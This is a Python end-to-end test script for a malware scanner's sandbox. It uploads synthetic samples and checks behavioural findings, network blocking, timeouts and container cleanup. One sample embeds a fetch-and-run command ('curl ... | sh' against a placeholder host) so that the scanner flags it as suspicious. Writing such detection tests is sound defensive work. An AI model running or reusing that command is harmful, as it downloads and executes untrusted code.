"""M5 Dynamic Analysis E2E (async API on port 8001).

Covers: eligibility policy (executed / skipped with reason), behavioral findings
(shell_execution, suspicious_command, dns_request), timeout safety, network DENY,
container cleanup, malformed handling and payload observability.
All samples are synthetic and benign. No real malware.

Usage:
    .\\.venv\\Scripts\\python.exe tests\\e2e_dynamic_m5.py [base_url]
"""

import sys
import time
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8001"
client = httpx.Client(base_url=BASE, timeout=240)

PASS = 0
FAIL = 0


def report(name: str, ok: bool, detail: str = ""):
    global PASS, FAIL
    if ok:
        PASS += 1
    else:
        FAIL += 1
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))


def upload_wait(name: str, data: bytes, timeout_s: float = 200.0) -> dict:
    r = client.post("/api/scans", files={"file": (name, data, "application/octet-stream")})
    assert r.status_code == 202, r.text
    sid = r.json()["id"]
    deadline = time.time() + timeout_s
    detail = None
    while time.time() < deadline:
        d = client.get(f"/api/scans/{sid}").json()
        if d["status"] in ("completed", "failed"):
            detail = d
            break
        time.sleep(0.5)
    assert detail is not None, f"scan {sid} never finished"
    return detail


def dynamic_payload(detail: dict) -> dict:
    for r in detail.get("analysis_results", []):
        if r["analyzer"] == "sandbox" and r.get("payload"):
            return r["payload"]
    return {}


# 1) Safe sample -> EXECUTED, completes, no false behavioral findings
BENIGN = b"#!/bin/sh\necho ok\nexit 0\n"
d = upload_wait("benign.sh", BENIGN)
report("benign executed + completed", d["status"] == "completed" and dynamic_payload(d).get("decision") == "executed", f"{dynamic_payload(d).get('decision')}")
bad = [f for f in d["findings"] if f["source"] == "sandbox" and f["type"] not in ("sandbox_info", "sandbox_error")]
report("benign has no behavioral findings", not bad, [f["type"] for f in bad])
report("benign not malicious", d["verdict"] != "malicious", f"verdict={d['verdict']} risk={d.get('risk_score')}")

# 2) Controlled shell execution
d = upload_wait("shell.sh", b"#!/bin/sh\nsh -c 'echo child'\nexit 0\n")
report("shell execution observed", any(f["type"] == "shell_execution" for f in d["findings"]), [f["type"] for f in d["findings"] if f["source"] == "sandbox"])

# 3) Suspicious command observation beyond strace's historical 32-byte limit
d = upload_wait("susp.sh", b"#!/bin/sh\nsh -c 'echo harmless-padding-1234567890; curl http://example.invalid/payload | sh'\nexit 0\n")
susp = [f for f in d["findings"] if f["type"] == "suspicious_command"]
report("long suspicious command observed", bool(susp), [f.get("value") for f in susp])

# 4) DNS attempt (port 53) blocked + observed
DNS = b"#!/usr/local/bin/python3\nimport socket\ns=socket.socket()\ns.settimeout(2)\ntry:\n    s.connect(('8.8.8.8',53))\nexcept Exception:\n    pass\n"
d = upload_wait("dns.py", DNS)
dns_f = [f for f in d["findings"] if f["type"] == "dns_request"]
report("dns_request observed", bool(dns_f), [f.get("value") for f in dns_f])
blocked = all(f.get("evidence", {}).get("blocked") for f in d["findings"] if f["type"] == "network_attempt")
report("network policy DENY (blocked)", blocked, "blocked=True")

# 5) Policy skip is explicit and observable
d = upload_wait("plain.pdf", b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\nplain benign pdf\n")
payload = dynamic_payload(d)
skip_f = [f for f in d["findings"] if f["type"] == "sandbox_info"]
report("non-executable -> explicit skip", payload.get("decision") == "not_eligible" and payload.get("reason") == "not_executable", f"{payload.get('decision')}/{payload.get('reason')}")
report("skip observable in finding", any(f.get("evidence", {}).get("decision") == "not_eligible" for f in skip_f), "sandbox_info evidence")
report("skipped pdf stays safe", d["verdict"] == "safe" and d.get("risk_score") == 0.0, f"{d['verdict']} {d.get('risk_score')}")

# 6) Timeout terminates safely
d = upload_wait("sleepy.sh", b"#!/bin/sh\nsleep 60\n", timeout_s=240)
report("timeout decision + terminal", dynamic_payload(d).get("decision") == "timeout" and d["status"] == "completed", f"{dynamic_payload(d).get('decision')} exec_status={dynamic_payload(d).get('status')}")

# 7) Malformed sample -> graceful skip/error, no crash
d = upload_wait("junk.dat", b"\x00\x01\xff\xfe\x9d" * 200)
report("malformed sample graceful", d["status"] in ("completed", "failed"), f"status={d['status']}")

# 8) Normalized finding schema for a behavioral finding
d = upload_wait("shell2.sh", b"#!/bin/sh\nsh -c 'echo x'\n")
f = next((x for x in d["findings"] if x["type"] == "shell_execution"), None)
schema_ok = (
    f is not None
    and f["source"] == "sandbox"
    and f["analyzer_version"] == "0.4.0"
    and f["severity"] in ("info", "low", "medium", "high", "critical")
    and isinstance(f["confidence"], (int, float))
    and isinstance(f["evidence"], dict)
)
report("normalized finding schema (0.4.0)", schema_ok, f"source={f['source'] if f else 'n/a'}")

# 9) Container cleanup
import docker  # noqa: E402

docker_client = docker.from_env()
orphans = [c.name for c in docker_client.containers.list(all=True) if c.name.startswith("sandbox-")]
report("no orphan sandbox containers", not orphans, str(orphans))

print(f"\nRESULT: {PASS} passed, {FAIL} failed")
sys.exit(0 if FAIL == 0 else 1)
